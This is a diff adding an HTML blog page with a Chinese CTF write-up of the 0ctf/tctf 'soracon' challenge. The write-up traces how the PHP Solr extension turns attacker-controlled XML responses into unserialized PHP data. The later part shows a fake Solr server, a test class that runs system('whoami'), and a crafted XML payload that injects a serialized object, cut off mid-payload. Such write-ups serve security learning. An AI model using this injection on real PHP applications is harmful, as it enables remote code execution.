@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html lang="">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>0ctf/tctf-soracon - byc_404&#39;s blog</title>
+  
+    <meta name="keywords" content="CTF,WEB">
+  
+
+  
+    <meta name="description" content="  这次0ctf/tctf 抽空看了下soracon这题。最终还是非常可惜，可能有多点时间做题就能解出了。下面是自己的一个思路流程。">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a href="https://www.baidu.com/s?wd=启用JavaScript" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索" />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="half" class='cover-wrapper post dock' style="display: ;">
+          
+            <div id='cover-backstretch'></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              id="home">
+              <i class='fas fa-rss fa-fw'></i><p>博客</p>
+            </a>
+          
+            <a href="/tags/"
+              
+              
+              id="tags">
+              <i class='fas fa-tags fa-fw'></i><p>标签</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              id="archives">
+              <i class='fas fa-archive fa-fw'></i><p>归档</p>
+            </a>
+          
+            <a href="/friends/"
+              
+              
+              id="friends">
+              <i class='fas fa-link fa-fw'></i><p>友链</p>
+            </a>
+          
+            <a href="/about/"
+              
+              
+              id="about">
+              <i class='fas fa-info-circle fa-fw'></i><p>关于</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        0ctf/tctf-soracon
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="https://www.bycsec.top" rel="nofollow">
+    <img no-lazy src="/assests/favicon.ico">
+    <p>byc_404</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jul 7, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="0ctf/tctf-soracon" data-path="/2021/07/07/0ctf-tctf-soracon/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p>  这次0ctf/tctf 抽空看了下soracon这题。最终还是非常可惜，可能有多点时间做题就能解出了。下面是自己的一个思路流程。</p>
+<a id="more"></a>
+
+
+<p>（什么时候才能做出zsx的题呢</p>
+<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p>题目给出了源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$host = $_GET['host'] ?? '127.0.0.1';</span><br><span class="line">$options = ['hostname' =&gt; $host, 'port' =&gt; 8983, 'path' =&gt; '/solr'];</span><br><span class="line">$client = <span class="keyword">new</span> SolrClient($options);</span><br><span class="line">$query = <span class="keyword">new</span> SolrQuery();</span><br><span class="line">$query-&gt;setQuery('lucene');</span><br><span class="line">$query_response = $client-&gt;query($query);</span><br><span class="line">$response = $query_response-&gt;getResponse();</span><br><span class="line">print_r($response);</span><br></pre></td></tr></table></figure>
+<p>这里用到的<code>SolrClient</code>等等类说明用到了php 的solr扩展。一般是直接pecl安装即可，我是windows环境所以就直接上<a href="https://pecl.php.net/package/solr" target="_blank" rel="noopener">pecl</a> 下一份源码，下一份编译好的dll。</p>
+<p>这里原本是打算自己编译一份dll看看要不要动态调试的。但是实际上漏洞点可以直接静态看出来，所以我就没有另外编译了。</p>
+<p>关于solr自己其实以前没有看过相关漏洞，所以去新安装了下，本地可以直接<code>solr start -e cloud</code>起。</p>
+<p>这里虽然不能直接看懂题目源码的具体目的，但是我们知道，可控点只有host。也就是说response 是可控的。那么我们从response 入手</p>
+<p>我们直接找getResponse,发现起调用的是接口solr_response_get_response_impl</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_54f1252f9274090714abfcbafac53b3e.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_54f1252f9274090714abfcbafac53b3e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>这里的php_var_unserialize代表，这里对response执行了反序列化。输入是第二个参数raw_response。这个就非常有意思了。我们的response作为可控参数的话，如果能利用反序列化必然是可以扩大攻击面。那么回溯看下这里的参数raw_response 能否控制，从而执行恶意反序列化。</p>
+<p>首先，可以发现，raw_response 来自buffer。<code>raw_resp = (unsigned char *) buffer.str;</code><br>而buffer则是根据if条件，有多种不同方式处理得到的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Z_STRLEN_P(response_writer))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strcmp</span>(Z_STRVAL_P(response_writer), SOLR_XML_RESPONSE_WRITER))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* SOLR_XML_RESPONSE_WRITER */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Convert from XML serialization to PHP serialization format */</span></span><br><span class="line">		solr_encode_generic_xml_response(&amp;<span class="built_in">buffer</span>, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response), Z_LVAL_P(parser_mode));</span><br><span class="line">		<span class="keyword">if</span>(return_array)</span><br><span class="line">		&#123;</span><br><span class="line">			solr_sobject_to_sarray(&amp;<span class="built_in">buffer</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strcmp</span>(Z_STRVAL_P(response_writer), SOLR_PHP_NATIVE_RESPONSE_WRITER) || <span class="number">0</span> == <span class="built_in">strcmp</span>(Z_STRVAL_P(response_writer), SOLR_PHP_SERIALIZED_RESPONSE_WRITER)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SOLR_PHP_NATIVE_RESPONSE_WRITER */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Response string is already in Native PHP serialization format */</span></span><br><span class="line">		solr_string_set(&amp;<span class="built_in">buffer</span>, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!return_array)</span><br><span class="line">		&#123;</span><br><span class="line">			solr_sarray_to_sobject(&amp;<span class="built_in">buffer</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strcmp</span>(Z_STRVAL_P(response_writer), SOLR_JSON_RESPONSE_WRITER)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> json_translation_result = solr_json_to_php_native(&amp;<span class="built_in">buffer</span>, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SOLR_JSON_RESPONSE_WRITER */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Convert from JSON serialization to PHP serialization format */</span></span><br><span class="line">		<span class="keyword">if</span> (json_translation_result &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			solr_throw_exception_ex(solr_ce_SolrException, SOLR_ERROR_1000, SOLR_FILE_LINE_FUNC, solr_get_json_error_msg(json_translation_result));</span><br><span class="line"></span><br><span class="line">			php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">"Error in JSON-&gt;PHP conversion. JSON Error Code %d"</span>, json_translation_result);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!return_array)</span><br><span class="line">		&#123;</span><br><span class="line">			solr_sarray_to_sobject(&amp;<span class="built_in">buffer</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是其实此处我们可以根据本地报错，直接确定就是第一个if。比如我远程起了一个node作为http server</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"></span><br><span class="line">app.use(logger(<span class="string">'dev'</span>))</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/solr/*'</span>, (req, res) =&gt; res.send(<span class="string">'233'</span>));</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8983</span>)</span><br></pre></td></tr></table></figure>
+<p>回显<br><img src="https://hackmd.summershrimp.com/uploads/upload_bfd8b68993d160d3bae4ac59b4df2145.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_bfd8b68993d160d3bae4ac59b4df2145.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>从error loading root of xml基本可以确定，期望的回显肯定是xml格式。而且后续的error unserializing 也基本确定其中会发生反序列化。</p>
+<p>那么我们跟进第一个if中的<code>solr_encode_generic_xml_response</code></p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_6957d2e03fa4a9bbb9a1229b41e707a7.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_6957d2e03fa4a9bbb9a1229b41e707a7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>发现有我们刚刚的报错信息。可以确认是这个分支了。接下来跟进<code>solr_encode_object</code><br><img src="https://hackmd.summershrimp.com/uploads/upload_37173b270a270d0f6dfe37c3668196ac.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_37173b270a270d0f6dfe37c3668196ac.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>这里不妨看下<code>solr_write_object_opener</code><br><img src="https://hackmd.summershrimp.com/uploads/upload_4f95c27cf8a0fe9f2568b6ed16360277.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_4f95c27cf8a0fe9f2568b6ed16360277.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>其实漏洞点到这里就有雏形了。此处opener这个函数明显是在往buffer里写序列化数据字符串。实际上，上面的<code>encode_xml_node</code>以及<code>object_closer</code>跟进去也会发现，是一样的思路。</p>
+<p>既然他的序列化数据是一段段拼接而成的，那么我们的可控数据自然也作为其中一部分被拼接进去了，最后执行反序列化。然而我们知道，php中序列化数据只要满足正确格式闭合关系，是可以通过提前闭合来实现反序列化逃逸的。这个不必多说。</p>
+<p>这里后面也可以跟下solr_encode_xml_node.也会发现其实就是在根据xml node的类型来选择不同函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> solr_encode_xml_node(__node, __buf, __enc_type, __arr_idx, __mode) solr_encoder_functions[solr_get_xml_type((__node))]((__node),(__buf), (__enc_type), (__arr_idx), (__mode))</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">solr_php_encode_func_t</span> solr_encoder_functions[] = &#123;</span><br><span class="line">	solr_encode_string,</span><br><span class="line">	solr_encode_null,</span><br><span class="line">	solr_encode_bool,</span><br><span class="line">	solr_encode_int,</span><br><span class="line">	solr_encode_float,</span><br><span class="line">	solr_encode_string,</span><br><span class="line">	solr_encode_array,</span><br><span class="line">	solr_encode_object,</span><br><span class="line">	solr_encode_document,</span><br><span class="line">	solr_encode_result,</span><br><span class="line">	<span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">solr_get_xml_type</span><span class="params">(xmlNode *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">solr_char_t</span> *node_name = (<span class="keyword">solr_char_t</span> *) node-&gt;name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!node_name)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> SOLR_ENCODE_STRING;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(node_name, <span class="string">"str"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> SOLR_ENCODE_STRING;</span><br><span class="line"></span><br><span class="line">	&#125; </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+
+<p>接下来本地模拟下。首先php代码选项加上proxy,抓包看下回显(这里solr已经新建了一个core byc了)</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_cdd12cc646c1357437639f914c869267.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_cdd12cc646c1357437639f914c869267.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lst</span> <span class="attr">name</span>=<span class="string">"responseHeader"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">"zkConnected"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"status"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"QTime"</span>&gt;</span>12<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lst</span> <span class="attr">name</span>=<span class="string">"params"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"q"</span>&gt;</span>lucene<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"indent"</span>&gt;</span>on<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"version"</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"wt"</span>&gt;</span>xml<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">lst</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">lst</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"response"</span> <span class="attr">numFound</span>=<span class="string">"0"</span> <span class="attr">start</span>=<span class="string">"0"</span> <span class="attr">maxScore</span>=<span class="string">"0.0"</span> <span class="attr">numFoundExact</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>感觉跟远程差的有点多。但是格式是清晰的。比如类型，名字都可以对应。我们按照这个，以及远程的回显格式其实就可以构造一个response了。</p>
+<p>本地测试，准备一个恶意类Evil。destruct里放一个命令执行函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回显设置里插入恶意序列化数据<code>O:4:&quot;Evil&quot;:0:{}</code>。然后后面闭合5个括号，这个是直接fuzz出来的。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"response"</span> <span class="attr">numFound</span>=<span class="string">"1"</span> <span class="attr">start</span>=<span class="string">"0"</span> <span class="attr">numFoundExact</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">doc</span> <span class="attr">name</span>=<span class="string">"byc"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"a"</span>&gt;</span>123456;i:1;O:4:"Evil":0:&#123;&#125;&#125;&#125;&#125;&#125;&#125;<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"q"</span>&gt;</span>lucene<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span 